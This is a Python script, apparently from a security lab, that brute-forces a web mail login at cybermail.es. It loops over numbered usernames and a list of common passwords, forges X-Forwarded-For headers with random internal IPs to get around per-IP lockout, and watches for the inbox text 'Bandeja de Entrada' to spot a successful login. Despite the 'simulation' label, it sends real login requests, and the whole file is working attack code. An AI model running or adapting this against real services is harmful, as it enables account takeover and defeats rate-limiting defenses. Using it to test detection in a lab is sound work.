import random
import requests
import time

SERVER_URL = "https://cybermail.es/login"  # Adjust
PASSWORDS = ["123456", "Str0ngP@ss!", "password", "123456789", "12345678", "12345", "1234567", "qwerty", "abc123", "password1"]  # Adjust

# Generate a random user between user1 and user30
def generate_random_user():
    user_id = random.randint(1, 30)  # Adjust
    return f"user{user_id}"

# Generate a random IP address
def generate_random_ip():
    SUBNETS = ["192.168.10", "192.168.20", "192.168.30"]  # Internal network
    choice = random.randint(0, 1)

    if choice == 0:
        subnet = random.choice(SUBNETS)
        host = random.randint(1, 254)
        return f"{subnet}.{host}"
    else:
        first_octet = random.randint(10, 245)
        host = random.randint(10, 245)
        return f"192.168.{first_octet}.{host}"

# Select a random password from the list
def generate_random_password():
    return random.choice(PASSWORDS)

print("Starting brute force simulation on random users...")

for _ in range(10):  # Number of users to try
    username = generate_random_user()
    random_ip = generate_random_ip()

    for _ in range(10):  # Attempts per user
        password = generate_random_password()
        print(f"Trying with username: {username}, password: {password}, from IP: {random_ip}")

        headers = {
            "Host": "cybermail.es",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://cybermail.es",
            "Referer": "https://cybermail.es/login",
            "X-Forwarded-For": random_ip
        }  # Adjust based on browser

        data = {
            "email": username,
            "password": password
        }

        try:
            response = requests.post(SERVER_URL, headers=headers, data=data, verify='/home/kali/myCA.pem')  # Adjust the CA path.
            response_text = response.text

            if "Bandeja de Entrada" in response_text:  # Adjust based on the server message
                print(f"Successful combination found: Username: {username}, Password: {password}")
                break
            else:
                print(f"Failed attempt with Username: {username}, Password: {password}")

        except requests.RequestException as e:
            print(f"Error during request: {e}")

        time.sleep(1)

print("Brute force simulation completed.")